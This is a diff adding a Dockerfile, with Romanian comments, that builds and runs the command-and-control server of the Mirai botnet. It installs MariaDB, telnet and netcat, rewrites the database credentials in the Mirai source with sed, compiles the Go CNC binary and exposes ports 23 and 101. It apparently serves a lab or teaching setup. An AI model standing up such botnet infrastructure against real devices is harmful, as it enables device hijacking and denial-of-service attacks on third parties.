@@ -1,0 +1,40 @@
+FROM golang:latest
+
+RUN apt update && apt install -y \
+    mariadb-server \
+    mariadb-client \
+    telnet \
+    netcat-openbsd
+
+
+# Creare director de lucru
+WORKDIR /app
+
+# Copiere fișiere necesare
+COPY db.sql /app/db.sql
+COPY entrypoint.sh /app/entrypoint.sh
+
+# Setare permisiuni
+RUN chmod +x /app/entrypoint.sh
+
+# Copiere cod sursă Mirai
+COPY ../Mirai-Source-Code /app/Mirai-Source-Code
+
+
+# Configurare CNC
+WORKDIR /app/Mirai-Source-Code/mirai
+RUN sed -i 's/root/asodb/' cnc/main.go
+RUN sed -i 's/password/asodb/' cnc/main.go
+
+# Construire aplicație CNC
+RUN go mod init cnc.mirai
+RUN go mod tidy
+RUN go build -o /app/cnc cnc/*.go
+
+# Setare porturi expuse
+EXPOSE 23 101
+
+# Entry point
+WORKDIR /app
+ENTRYPOINT ["/app/entrypoint.sh"]
+
